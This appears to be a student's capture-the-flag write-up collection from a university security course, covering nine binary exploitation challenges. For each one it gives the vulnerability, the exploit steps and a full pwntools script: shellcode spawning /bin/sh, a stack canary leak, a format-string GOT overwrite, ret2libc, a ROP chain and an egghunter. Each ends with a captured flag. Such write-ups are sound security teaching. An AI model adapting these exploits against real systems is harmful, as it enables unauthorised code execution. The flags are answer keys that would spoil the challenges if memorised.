shellz
===========================

General overview of problems faced
-------------------------------------
- Had to learn how to beat aslr

List of vulnerabilities
------------------------
1. The program uses gets which can result in a buffer overflow as it continues to read into an array without checking boundaries

2. The stack is executable. We can overwrite the return address to stack and whatever was written in the buffer can be overwritten

Steps to exploit
------------------
1. Used checksec to find was security measure was enabled. Everything was turned off except for ASLR
2. Disassemble the code and notice how it only has one function (main)
3. The gets function is used in main, a buffer overflow attack can be used with shellcode to gain a shell
4. As ASLR is enabled run the binary a few times in GDB and try to find an address that doesn't change
5. Notice that eax holds our input and doesn't change. We can use this to overwrite the return address
6. To get the address of eax use ROPgadget and grep for call eax to get the address
7. Send the send the shellcode, the payload to cause a buffer overflow and the address of call eax to gain access to the shell
8. Cat the flag

Script/Command used
------------------
```
#!/usr/bin/python
from pwn import *

#p = process("./shellz")
p = remote("wargames.6447.sec.edu.au", 5004)

shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
payload = (8204 - len(shellcode))*"A"
eax_addr = p32(0x08048406)

p.sendline(shellcode + payload + eax_addr)
p.interactive()

```

`6447{1849748d-6e69-4bca-ab03-67b0778ef9bb}`

stack-dump
===========================

General overview of problems faced
-------------------------------------
- Finding the address of the canary value and beating it
- Beating ASLR


List of vulnerabilities
------------------------
1. Binary uses the gets function which reads indefinetly until it reaches a new line or EOF and this can result in a buffer overflow.
2. The ability to read arbitary memory allows for reading the canary without too much trouble

Steps to exploit
------------------
1. Receive the first two lines from the server, and remember the stack pointer.
2. Find the canary pointer and offset it correctly to avoid it.
3. Wait for the options to be shown and select input data using the address of the canary
4. Dump the memory at this address
5. Redirect the code execution to the win address using a buffer overflow to overwrite return.
6. Cat the flag

Script/Command used
------------------
```
#!/usr/bin/python

from pwn import *

p = remote('wargames.6447.sec.edu.au', 6003)

WIN = 0x80486cd

p.recvuntil("stack pointer ")
canaryPtr = p.recvline()
canaryPtr = int(canaryPtr[2:], 16)
canaryPtr = canaryPtr + int('6d', 16) - int('4',16)
p.recvuntil("d) quit\n")
p.sendline('a')
p.recvuntil('len: ')
p.sendline('4')
p.sendline(p32(canaryPtr))
p.recv()
p.sendline('b')
p.recvuntil(": ")
canary = p.recvn(4)
p.sendline('a')
p.recvuntil('len: ')
p.sendline('A'*(0x60) + canary + "A"*12 + p32(WIN))
p.recv()
p.sendline('d')
p.interactive()
```

`6447{31c83bef-e49b-4104-bdeb-bae408e8ef84}`


sploitwarz
===========================

General overview of problems faced
-------------------------------------
- Learn how to beat ASLR and PIE
- Had to relearn how the procedure linkage table and global offset table

List of vulnerabilities
------------------------
1. Used printf which can lead to format string exploit when submitted data of an input string is evaluated as a command by the application
2. The global offset table is writable which can result in a code redirection.

Steps to exploit
------------------
1. Disassemble the code and notive that it has many functions within it. But the most important functions is present is do_gamble as it contains a vulnerable printf.
2. Using checksec notice that PIE is enabled.
3. To find the leaked stack address use %3$8x as your handle.
4. To get the leaked address win the gamble by choosing the option that isn't a fibonacci number
5. Calculate the base address then pad each byte in order to do a format string attack
6. Change the handle again to the exploit created
7. Gamble and win again to overwrite the GOT and record the flag

Script/Command used
------------------
```
#!/usr/bin/python

from pwn import *

# Open connection
# context.log_level = 'DEBUG'
#p = process(['./sploitwarz'])
p = remote('wargames.6447.sec.edu.au', 7003)

# Calculate the fibonacci sequence to beat 'gamble'
def calc_fibSeq():
    seq = [0]
    a, b = 0, 1
    while (len(seq) < 20):
        seq.append(b)
        a, b = b, a + b
    return seq

# Required offsets
win_addr = 0x155c
leak_addr = 0x209f
gamble_addr = 0x1f7a
printf_addr = 0x4cb8
stack = 9

# Get the leaked stack address
p.recvuntil("what's your handle?\n")
p.sendline('%3$8x')
p.recvuntil("What will you do? ")
p.sendline("g")
p.recvuntil("):")
p.sendline("0.0001")
p.recvuntil("one out:\n")

# Beat gamble to grab stack leak
fibSeq = calc_fibSeq()
for i in range(5):
    p.recvuntil(") ")
    if (int(p.recvuntil("\n")[:-1])) not in fibSeq:
        break
p.recvuntil("> ")
p.sendline(str(i+1))
p.recvuntil('Well done, ')
stackLeak = p.recvuntil("!")[:-1]
stackLeak = '0x' + stackLeak

# Calc base address
stackLeak = int(stackLeak, 16)
baseAddr = stackLeak - leak_addr

printfAddr = p32(baseAddr + printf_addr)
winAddr = str(p32(baseAddr + win_addr))

# Craft exploit
exploit = ""

exploit += str(p32(u32(printfAddr)+ 0))
exploit += str(p32(u32(printfAddr)+ 1))
exploit += str(p32(u32(printfAddr)+ 2))
exploit += str(p32(u32(printfAddr)+ 3))

outLen = len(exploit)
padding = []
padding.append(ord(winAddr[0])+ 0x100 - outLen)
padding.append(ord(winAddr[1])+ 0x100 - ord(winAddr[0]))
padding.append(ord(winAddr[2])+ 0x100 - ord(winAddr[1]))
padding.append(ord(winAddr[3])+ 0x100 - ord(winAddr[2]))

exploit += "%" + str(padding[0]) + "x" + "%" + str(stack) + "$hhn"
exploit += "%" + str(padding[1]) + "x" + "%" + str(stack + 1) + "$hhn"
exploit += "%" + str(padding[2]) + "x" + "%" + str(stack + 2) + "$hhn"
exploit += "%" + str(padding[3]) + "x" + "%" + str(stack + 3) + "$hhn"

# Change handle to be the exploit
p.recvline()
p.sendline("a")
p.recvuntil("What will you do?")
p.sendline("c")
p.sendline("c")
p.recvuntil("What is your new handle?")
p.sendline(exploit)

# Re-gamble to overwite GOT and get flag
p.recvuntil('What will you do? ')
p.sendline('g')
p.recvuntil("): ")
p.sendline('.1')
p.recvuntil("one out:\n")
fibSeq = calc_fibSeq()
for i in range(5):
    p.recvuntil(") ")
    if (int(p.recvuntil("\n")[:-1])) not in fibSeq:
        break
p.recvuntil("> ")
p.sendline(str(i+1))
p.recvline()
p.recvuntil("dea")
flag = p.recvline()
print '\n' + flag

```

`6447{4ee67e05-ec23-4d7a-9b12-b17a3b251656}`


piv_it
===========================

General overview of problems faced
-------------------------------------
- Had to learn how to beat a non-executable stack

Steps to exploit
------------------
1. Same steps as roproprop except a buffer of different size was needed to cause a buffer overflow.;
2. This only works a few times, doesn't always garuntee to print out the flag

Script/Command used
------------------
```
#!/usr/bin/env python

from pwn import *
from time import sleep


p = remote('wargames.6447.sec.edu.au', 8001)

p.recvuntil('random number: ')
printf_leak = p.recvline()
printf_addr = int(printf_leak, 16)
p.recv()


# the following values are for remote libc-2.23
offset_printf = 0x049670
offset_system = 0x03ada0
offset_str_bin_sh = 0x15ba0b
libc_base = printf_addr - offset_printf

payload = 'AA' + (p32(libc_base+offset_system) + 'AAAA' + p32(libc_base+offset_str_bin_sh)) * ((0x80/12)+1)
payload = payload[:0x80] # trim excess bytes
p.send(payload)
p.recv()

payload = 'AA' + (p32(libc_base+offset_system) + 'AAAA' + p32(libc_base+offset_str_bin_sh)) * (((0x1c-0x08)/12)+1)
payload = payload[:0x1c - 0x08] # trim excess bytes
p.sendline(payload)
p.recv()

p.interactive()

```

`6447{38b126bc-24b0-404d-81db-7a2f74ea4941}`


roproprop
===========================

General overview of problems faced
-------------------------------------
- Had to learn how to beat a non-executable stack

List of vulnerabilities
------------------------
- The binary uses gets() which can result in a buffer-overflow as it doesn't stop reading until it reaches a EOF or a new line

Steps to exploit
------------------
1. Get the leaked address to find the libc verion used. (I used the online database to find the version using the address I got)
2. From the online database we can get the offset of system and /bin/sh and then we can calculate the base of this libc
3. Buffer is at ebp-0x541 so we add one random byte so the rest being at ebp-0x540
4. Send of a payload containing the libc base plus the offset of system and 4 random bytes and base with the offset of /bin/sh to a writeable area in memory to execute this.
5. This only works sometimes just like piv_it

Script/Command used
------------------
```
#!/usr/bin/env python

from pwn import *
from time import sleep
import re


p = remote('wargames.6447.sec.edu.au', 8002)
#p = process('./roproprop')

p.recvuntil('favourite number: ')
puts_leak = p.recvline()
puts_addr = int(puts_leak, 16)
p.recv()


# the following values are for remote libc-2.23
offset_puts = 0x05fca0
offset_system = 0x03ada0
offset_str_bin_sh = 0x15ba0b
libc_base = puts_addr - offset_puts

payload = '\x00'

payload += (p32(libc_base+offset_system) + 'AAAA' + p32(libc_base+offset_str_bin_sh)) * ((0x540/12)+1)

payload = payload[:(0x541 - 0x08)]

p.sendline(payload)
p.recv()

p.interactive()

```

`6447{1403f546-2002-4f3a-8da7-13493dc643b7}`


swrop
===========================

General overview of problems faced
-------------------------------------
- Learning to use gadgets correctly
- Learning to beat ASLR and non-executable stack

List of vulnerabilities
------------------------
1. PIE wasn't turned on
2. System syscall was left in the binary along with the address of /bin/sh

Steps to exploit
------------------
1. Use checksec to find out which security measures have been used, only NX is enabled
2. Disassemble the file and notice System is left in the binary, so record the address of system and record the address of /bin/bash used in .rodata
3. Find a buffer that is large enough to cause an overflow that redirects to system syscall than call /bin/bash 

Script/Command used
------------------
```
#!/usr/bin/env python

from pwn import *
from time import sleep
import re

p = remote('wargames.6447.sec.edu.au', 8003)
#p = process('./swrop')

# 0x08048600: "/bin/bash"
bash_addr = 0x08048600
# 0x080484d8: call system
gadget_addr = 0x080484d8

p.recv()
payload = 'A'*0x8c + p32(gadget_addr) + p32(bash_addr)
p.sendline(payload)

p.interactive()
```

`6447{1feda6d2-8033-4c40-86cb-f46c2ad98888}`


static
===========================

General overview of problems faced
-------------------------------------
- Learning to use a rop chain
- Learning how to beat non-excutable stack

List of vulnerabilities
------------------------
- The binary uses gets() which keeps reading from stdin until it reaches a new line or EOF, this can result in a buffer overflow

Steps to exploit
------------------
1. Use checksec to see which security measures have been used, and only NX has been used.
2. Find the address that is used to make the syscall to /bin/sh.
3. eax can be used for evecve, ebx is the address in memory of string /bin/sh, ecx is the address of a pointer to the string /bin/sh, and 0x80 is syscall instruction
4. Using the pointers above set up a rop chain that calls the /bin/sh into a writeable memory region
5. Find the size of the buffer to overflow to a writeable region of memory

Script/Command used
------------------
```
#!/usr/bin/env python2

from pwn import *
from time import sleep
import re
from struct import pack


p = remote('wargames.6447.sec.edu.au', 8004)
#p = process('./static')
p.recv()

f = lambda x : pack('I', x)
IMAGE_BASE_0 = 0x08048000 # static
rebase_0 = lambda x : f(x + IMAGE_BASE_0)
rop = ''
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret; 
rop += '//bi'
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret; 
rop += 'n/sh'
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret; 
rop += rebase_0(0x000a3064)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret; 
rop += f(0x00000000)
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x0005254d) # 0x0809a54d: mov dword ptr [edx], eax; ret; 
rop += rebase_0(0x000001c9) # 0x080481c9: pop ebx; ret; 
rop += rebase_0(0x000a3060)
rop += rebase_0(0x0009ef54) # 0x080e6f54: pop ecx; push cs; or al, 0x41; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x00026ada) # 0x0806eada: pop edx; ret; 
rop += rebase_0(0x000a3068)
rop += rebase_0(0x00073236) # 0x080bb236: pop eax; ret; 
rop += f(0x0000000b)
rop += rebase_0(0x000271a0) # 0x0806f1a0: int 0x80; ret; 
 
p.recv()
p.sendline('A'*0xc + rop)
p.interactive()

```

`6447{698fe9fd-1c5e-4992-b2c0-6df10e7e718a}`


simple
===========================

General overview of problems faced
-------------------------------------
- Had to learn to use pwntools to write assembly that can be converted to shellcode
- Had to quickly relearn how to use read and write

List of vulnerabilities
------------------------
1. Stack wasn't completely non-executable. Syscalls like read and write could still be used allowing us to read things of the stack, by executing shellcode.

Steps to exploit
------------------
1. Use checksec to see what security measures have been used. ASLR, PIE and NX (partially) has been enabled.
2. Disassemble the code and notice it only has a main.
3. The only interesting thing in the main is the flag file is opened.
4. Run the code and notice our hint is all syscalls are disabled except for read and write and flag is open at file descriptor = 100
5. Write an exploit that uses shellcode to use read syscall at fd = 1000 to a buffer on the stack and write to stdout (fd = 1) from a buffer a buffer on the stack.
6. Record the flag

Script/Command used
------------------
```
#!/usr/bin/python

from pwn import *

#p = process("./simple")
p = remote("misc.6447.sec.edu.au",8005)

#write a shellcode to read to fd 1000
#then write to fd 1 (standard output)

shellcode = asm('''
xor ebx, ebx
mov bx, 0x3e8
mov ecx, esp
push 0x2b
pop edx
push SYS_read
pop eax
int 0x80
push 1
pop ebx
mov ecx, esp
push 0x2b
pop edx
push SYS_write
pop eax
int 0x80
''')

p.sendline(shellcode)
p.interactive()

```

`6447{916709a2-490a-4ee1-b631-62452673a148}`


egg
===========================

General overview of problems faced
-------------------------------------
- Had to learn how to beat a non-executable stack
- Had to learn how to write an egghunter

List of vulnerabilities
------------------------
1. If anything was entered into the small buffer made by the egghunter it will be executed

Steps to exploit
------------------
1. Run checksec to see which security measures have been used, only NX is enabled
2. Find a place in memory to write a short egghunter to place in the small buffer
3. When the previous step is successful execute the big buffer which starts to do the same thing as in simple except the buffer this time isn't esp but esi.
4. Record the flag.

Script/Command used
------------------
```
#!/usr/bin/env python

from pwn import *
import re


p = remote('misc.6447.sec.edu.au', 8006)
#p = process('./egg')

p.recvuntil('smallbuf shellcode')
p.sendline(asm('mov eax, dword [esp+0x38]; jmp eax;'))

p.recvuntil('bigbuf shellcode:')
p.sendline(asm(shellcraft.read(1000, 'esi', 42)) + asm(shellcraft.write(1, 'esi', 42)))

p.recvuntil('* jumping to smallbuf\n')

print(p.recvuntil('}'))

```

`6447{16baa76c-2d52-4972-be1b-d8b600e2c335}`